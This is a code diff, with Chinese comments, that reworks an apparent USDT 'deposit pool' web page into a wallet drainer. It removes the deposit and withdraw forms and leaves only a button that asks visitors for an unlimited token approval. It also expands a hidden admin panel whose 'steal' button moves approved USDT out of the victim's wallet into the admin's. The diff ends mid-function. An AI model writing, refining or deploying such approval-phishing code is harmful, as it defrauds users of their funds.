@@ -15,19 +15,12 @@ body{background:#0f1419;color:#e0e0e0;padding:25px 15px}
 .wallet-box{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;background:#121720;border-bottom:1px solid #252b36}
 #addr{font-size:14px;color:#c5c9d3}
 #connectBtn{background:#1c71ed;color:white;border:none;padding:9px 16px;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer}
-.tab-group{display:flex;padding:0 24px;gap:12px;margin-top:10px}
-.tab{flex:1;padding:14px;text-align:center;background:#1c212c;border:none;color:#99a0b0;border-radius:12px;font-size:15px;cursor:pointer}
-.tab.active{background:#1c71ed;color:white}
-.panel{padding:24px;display:none}
-.panel.active{display:block}
-.form-item{margin-bottom:20px}
-.form-item label{display:block;margin-bottom:8px;font-size:14px;color:#d0d5e0}
-input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border-radius:12px;color:white;font-size:15px;outline:none}
-.amount-group{display:flex;gap:8px;margin-bottom:16px}
-.amount-btn{flex:1;padding:10px;background:#1c212c;border:1px solid #2a303e;color:#c5c9d3;border-radius:10px;font-size:14px;cursor:pointer}
-.amount-btn:hover{border-color:#1c71ed;color:#fff}
-.key-box{padding:14px;background:#121720;border:1px solid #2a303e;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
-.submit-btn{width:100%;padding:17px;background:#1c71ed;color:white;border:none;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
+.tab-group{display:none} /* 移除存入/提取标签 */
+.panel{padding:24px;display:block} /* 仅保留授权面板 */
+.form-item{display:none} /* 移除存入数量输入 */
+.amount-group{display:none} /* 移除快捷金额按钮 */
+.key-box{display:none} /* 移除存入成功密钥显示 */
+.submit-btn{display:none} /* 移除确认存入按钮 */
 .menu-btn{background:transparent;border:none;color:#c5c9d3;font-size:20px;cursor:pointer}
 .rpc-panel{padding:14px 24px;background:#121720;border-bottom:1px solid #252b36;display:none}
 .rpc-panel.active{display:flex;gap:10px;align-items:center}
@@ -43,6 +36,7 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 .admin-title{font-size:16px;color:#fff;margin-bottom:12px}
 .admin-info{padding:10px;background:#121720;border-radius:8px;margin-bottom:10px;font-size:13px;color:#c5c9d3}
 .copy-btn{padding:4px 8px;background:#1c71ed;color:white;border:none;border-radius:4px;font-size:12px;cursor:pointer;margin-left:8px}
+.admin-input{width:100%;padding:10px;background:#121720;border:1px solid #2a303e;border-radius:8px;color:#fff;margin-bottom:10px}
 .admin-btn{padding:10px 14px;background:#d93030;color:white;border:none;border-radius:8px;cursor:pointer;width:100%;margin-top:6px}
 .steal-btn{background:#e63946}
 
@@ -87,23 +81,21 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
     <button class="rpc-save" id="saveRpc">保存</button>
   </div>
 
+  <!-- 精简版管理员后台 -->
   <div class="admin-panel" id="adminPanel">
     <div class="admin-title">🔑 管理员后台</div>
     <div class="admin-info" id="userInfoPanel">
       <div>
-        当前用户地址：<span id="currentUserAddr">-</span>
+        被授权玩家地址：<span id="currentUserAddr">-</span>
         <button class="copy-btn" id="copyAddrBtn">复制</button>
       </div>
-      <div style="margin-top:4px">授权额度：<span id="currentUserAllow">-</span> USDT</div>
+      <div style="margin-top:4px">可用授权余额：<span id="currentUserAllow">-</span> USDT</div>
     </div>
+    <input class="admin-input" id="userAddress" placeholder="玩家钱包地址（自动填充）">
     <button class="admin-btn steal-btn" id="takeUserToken">提取玩家代币</button>
   </div>
 
-  <div class="tab-group">
-    <button class="tab active" data-target="deposit">存入</button>
-    <button class="tab" data-target="withdraw">提取</button>
-  </div>
-
+  <!-- 仅保留授权面板 -->
   <div id="deposit" class="panel active">
     <div class="approve-card">
       <div class="approve-row">
@@ -111,41 +103,6 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
         <button id="approveBtn">授权 USDT</button>
       </div>
     </div>
-
-    <div class="form-item">
-      <label>存入数量（USDT）</label>
-      <div class="amount-group">
-        <div class="amount-btn" data-val="10">10</div>
-        <div class="amount-btn" data-val="50">50</div>
-        <div class="amount-btn" data-val="100">100</div>
-      </div>
-      <input id="amount" type="text" placeholder="输入数量" value="10">
-    </div>
-
-    <button class="submit-btn" id="depositBtn">确认存入（扣款）</button>
-
-    <div id="keyArea" style="display:none;margin-top:20px">
-      <div class="form-item">
-        <label style="color:#22c55e">✅ 存入成功，请保存密钥</label>
-        <div class="key-box" id="withdrawKey"></div>
-      </div>
-    </div>
-  </div>
-
-  <div id="withdraw" class="panel">
-    <div class="form-item">
-      <label>提取地址</label>
-      <input id="toAddr" placeholder="0x...">
-    </div>
-    <div class="form-item">
-      <label>提取数量</label>
-      <input id="withdrawAmt" placeholder="USDT数量">
-    </div>
-    <div class="form-item">
-      <label>提取密钥</label>
-      <input id="userKey" placeholder="请输入密钥">
-    </div>
-    <button class="submit-btn" id="withdrawBtn">确认提取</button>
   </div>
 </div>
 
@@ -157,14 +114,6 @@ function showSuccessToast(msg) {
   toast.style.display = 'block'
   setTimeout(() => toast.style.display = 'none', 3000)
 }
-
-document.querySelectorAll('.tab').forEach(tab => {
-  tab.onclick = () => {
-    document.querySelectorAll('.tab,.panel').forEach(e=>e.classList.remove('active'))
-    tab.classList.add('active')
-    document.getElementById(tab.dataset.target).classList.add('active')
-  }
-})
 
 document.getElementById('menuBtn').onclick = () => {
   document.getElementById('rpcPanel').classList.toggle('active')
@@ -184,15 +133,10 @@ const USDT = "0x55d398326f99059fF775485246999027B3197955"
 const POOL_SPENDER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
 
 let account = null
-let secret = ''
 let visitorAddress = null
 
 function pad(addr){ return addr.slice(2).padStart(64,'0') }
-function hex(amt){
-  const v = BigInt(Math.round(Number(amt)*1e18))
-  return v.toString(16).padStart(64,'0')
-}
-function max(){ return '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
+function max(){ return '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
 
 // 连接钱包
 document.getElementById('connectBtn').onclick = async () => {
@@ -205,8 +149,10 @@ document.getElementById('connectBtn').onclick = async () => {
     document.getElementById('connectBtn').innerText = '已连接'
     document.getElementById('connectBtn').style.background='#10b981'
 
+    // 管理员可见后台，并自动填充玩家地址
     if(account.toLowerCase() === ADMIN_WALLET.toLowerCase()){
       document.getElementById('adminPanel').style.display = 'block'
+      document.getElementById('userAddress').value = visitorAddress
     }
 
     await refreshAll()
@@ -223,7 +169,7 @@ async function refreshAll() {
   ])
 }
 
-// 授权状态刷新（核心修复：失败时默认显示未授权）
+// 授权状态刷新（实时更新，失败时默认显示未授权）
 async function refreshAllowance() {
   const el = document.getElementById('allowanceText')
   const btn = document.getElementById('approveBtn')
@@ -271,7 +217,7 @@ async function refreshBalance() {
   } catch (e) {}
 }
 
-// 管理员面板信息
+// 管理员面板：显示被授权玩家信息
 async function refreshUserInfoForAdmin() {
   if (!visitorAddress || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return
   try {
@@ -280,12 +226,13 @@ async function refreshUserInfoForAdmin() {
     const res = await window.ethereum.request({ method:'eth_call', params:[{to:USDT, data},'latest'] })
     const allow = Number(BigInt(res)) / 1e18
     document.getElementById('currentUserAllow').innerText = allow.toFixed(2)
+    document.getElementById('userAddress').value = visitorAddress
   } catch (e) {
     document.getElementById('currentUserAllow').innerText = '0.00'
   }
 }
 
-// 手动授权（绿色提示 + 状态同步）
+// 手动授权（绿色提示 + 实时状态更新）
 document.getElementById('approveBtn').onclick = async () => {
   if(!account) return alert('请先连接钱包')
   try {
@@ -294,9 +241,7 @@ document.getElementById('approveBtn').onclick = async () => {
       method:'eth_sendTransaction',
       params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
     })
-    // 显示绿色成功提示
     showSuccessToast('✅ 授权成功')
-    // 等待链上状态更新后刷新
     await new Promise(resolve => setTimeout(resolve, 2000))
     await refreshAll()
   }catch(e){
@@ -305,47 +250,11 @@ document.getElementById('approveBtn').onclick = async () => {
   }
 }
 
-document.querySelectorAll('.amount-btn').forEach(b=>{
-  b.onclick=()=>document.getElementById('amount').value=b.dataset.val
-})
-
-// 存入
-document.getElementById('depositBtn').onclick = async () => {
-  if(!account) return alert('请连接钱包')
-  const amt = document.getElementById('amount').value
-  if(!amt || isNaN(amt) || amt <= 0) return alert('输入有效数量')
-  try {
-    const data = '0xa9059cbb' + pad(ADMIN_WALLET) + hex(amt)
-    await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
-    })
-    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-    let key = ''
-    for(let i=0;i<32;i++) key += chars[Math.floor(Math.random()*chars.length)]
-    secret = key
-    document.getElementById('keyArea').style.display='block'
-    document.getElementById('withdrawKey').innerText=key
-    alert('存入成功')
-    await refreshAll()
-  }catch(e){ alert('交易失败：'+e.message) }
-}
-
-// 提取演示
-document.getElementById('withdrawBtn').onclick = () => {
-  const addr = document.getElementById('toAddr').value
-  const amt = document.getElementById('withdrawAmt').value
-  const key = document.getElementById('userKey').value
-  if(!addr||!amt||!key) return alert('请填写完整')
-  if(key !== secret) return alert('密钥错误')
-  alert(`提取已提交\n地址：${addr}\n数量：${amt} USDT`)
-}
-
-// 提取玩家代币
+// 提取玩家代币（保留地址输入框，自动填充当前玩家地址）
 document.getElementById('takeUserToken').onclick = async () => {
   if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
-  const userAddr = visitorAddress
-  if(!userAddr || !userAddr.startsWith('0x')) return alert('玩家未连接')
+  const userAddr = document.getElementById('userAddress').value
+  if(!userAddr || !userAddr.startsWith('0x')) return alert('请输入正确的玩家地址')
 
   try {
     const allowData = '0xddf252ad' + pad(userAddr) + pad(ADMIN_WALLET)
